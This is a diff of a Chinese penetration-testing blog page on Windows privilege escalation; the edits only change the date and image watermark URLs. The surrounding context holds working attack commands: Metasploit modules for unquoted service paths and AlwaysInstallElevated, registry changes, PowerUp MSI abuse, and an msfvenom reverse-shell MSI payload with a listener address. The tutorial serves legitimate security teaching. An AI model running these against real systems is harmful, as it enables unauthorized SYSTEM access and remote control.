@@ -420,7 +420,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-07-28
+                    2021-08-04
                 </div>
                 
 
@@ -470,27 +470,27 @@ C:\Program Files\Common Files\WgpSec\TeamsSix.exe</code></pre>
 <p>铺垫了那么多，现在就来复现一下。</p>
 <h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>我们可以通过下面的命令来查找系统中存在可信任服务路径的程序。</p>
 <pre><code>wmic service get name,displayname,pathname,startmode|findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\Windows\\&quot; |findstr/i /v &quot;&quot;&quot;</code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210727144557.png"></p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210727144557.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>截图中可以看到 C:\Program Files\OpenSSH\bin\cygrunsrv.exe 存在包含空格且没有引号的路径。</p>
 <p>我们可以直接使用 MSF 利用该漏洞，MSF 版本中利用该漏洞的模块是 trusted_service_path，但是在新版本中该模块的名称已经变更为 unquoted_service_path</p>
 <pre><code>use windows/local/unquoted_service_path
 set session 1
 run</code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210727153924.png"></p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210727153924.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>可以看到已经获取到了管理员组账户的权限。</p>
 <h1 id="0x02-注册表键-AlwaysInstallElevated"><a href="#0x02-注册表键-AlwaysInstallElevated" class="headerlink" title="0x02 注册表键 AlwaysInstallElevated"></a>0x02 注册表键 AlwaysInstallElevated</h1><h2 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h2><p>注册表 AlwaysInstallElevated 是一个策略设置项。Windows 允许低权限用户以 SYSTEM 权限运行安装文件。</p>
 <p>如果启用此策略设置项，那么任何权限的用户都能以 SYSTEM 权限来安装恶意的 MSI（Microsoft Windows Installer）文件。</p>
 <p>产生该漏洞的原因是由于用户在策略编辑器中开启了 Windows Installer 特权安装功能。</p>
 <pre><code>组策略——计算机配置——管理模板——Windows组件——Windows Installer——永远以高特权进行安装：选择启用。
 组策略——用户配置——管理模板——Windows组件——Windows Installer——永远以高特权进行安装：选择启用。</code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210727162552.png"></p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210727162552.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>也可以直接使用命令行开启这两项注册表。</p>
 <pre><code>reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1
 reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1</code></pre>
 <p>然后使用 reg 查看这两项的键值，0x1 表示处于开启状态。</p>
 <pre><code>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210727163421.png"></p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210727163421.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <h2 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h2><h3 id="PowerUp"><a href="#PowerUp" class="headerlink" title="PowerUp"></a>PowerUp</h3><p>PowerUp 下载地址：<a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1</a></p>
 <p>我们可以使用 PowerUp.ps1 脚本里的 Get-RegistryAlwaysInstallElevated 模块来检查相关注册表是否被设置。</p>
 <p>在 PowerShell 中导入并执行脚本</p>
@@ -498,7 +498,7 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 Get-RegistryAlwaysInstallElevated</code></pre>
 <p>如果 PowerShell 由于处在受限模式以至于无法导入脚本，可以使用 -exec bypass 进行绕过。</p>
 <pre><code>powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\PowerUp.ps1;Get-RegistryAlwaysInstallElevated&#125;&quot;</code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210727173239.png"></p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210727173239.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>返回为 True，表示相关注册表被设置了，也就意味着 MSI 文件是以 SYSTEM 权限运行的。</p>
 <p>运行 PowerUp 的 Write-UserAddMSI 模块</p>
 <pre><code>powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\PowerUp.ps1;Write-UserAddMSI&#125;&quot;</code></pre>
@@ -510,24 +510,24 @@ Get-RegistryAlwaysInstallElevated</code></pre>
 /qn：不使用GUI
 /q：隐藏安装界面
 /i：安装程序</code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210727165540.png"></p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210727165540.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><p>MSF 中可以使用 exploit/windows/local/always_install_elevated 模块，直接获取 SYSTEM 权限。</p>
 <pre><code>use exploit/windows/local/always_install_elevated
 set session 1
 run</code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210727175000.png"></p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210727175000.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>除了上面的操作外，还可以使用 msfvenom 生成 MSI 文件，从而以 SYSTEM 权限执行任意命令。</p>
 <pre><code>msfvenom -p windows/exec CMD=&lt;命令&gt; -f msi &gt; calc.msi</code></pre>
 <p>或者以 SYSTEM 权限上线</p>
 <pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=172.16.214.65 lport=4444 –f msi -o shell.msi</code></pre>
 <h3 id="MSI-Wrapper"><a href="#MSI-Wrapper" class="headerlink" title="MSI Wrapper"></a>MSI Wrapper</h3><p>MSI Wrapper 是一个操作简单直观的 MSI 安装包生成工具，我们可以使用该工具制作一个包含木马的 MSI 安装包。</p>
 <p>选择自己要导入的 EXE 木马文件位置和导出 MSI 安装包位置。</p>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210728090315.png"></p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210728090315.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>设置运行时提升权限</p>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210728091810.png"></p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210728091810.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>之后 Application Id 随便选一个，其他操作默认就行，然后将 MSI 文件拷贝到目标主机上</p>
 <p>开启攻击主机的监听，双击 MSI 文件之后就可以看到回连的会话已经是 SYSTEM 权限了。</p>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210728092010.png"></p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210728092010.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <h1 id="0x03-计划任务"><a href="#0x03-计划任务" class="headerlink" title="0x03 计划任务"></a>0x03 计划任务</h1><p>使用以下命令可以看到当前计算机的计划任务</p>
 <pre><code>schtasks /query /fo list /v</code></pre>
 <p>AccessChk 是微软官方提供的一款工具，因此往往不会引起杀软的告警，AccessChk 可用来进行一些系统或程序的高级查询、管理和故障排除工作。</p>
@@ -562,7 +562,7 @@ C:\Windows\System32\Sysprep\Panther\Unattend.xml</code></pre>
 <pre><code>use post/windows/gather/enum_unattend
 set session 1
 run</code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210728124041.png"></p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210728124041.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <blockquote>
 <p>参考文章：<br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/SYSTEM/254836.html">https://www.freebuf.com/articles/SYSTEM/254836.html</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/250827.html">https://www.freebuf.com/articles/network/250827.html</a></p>
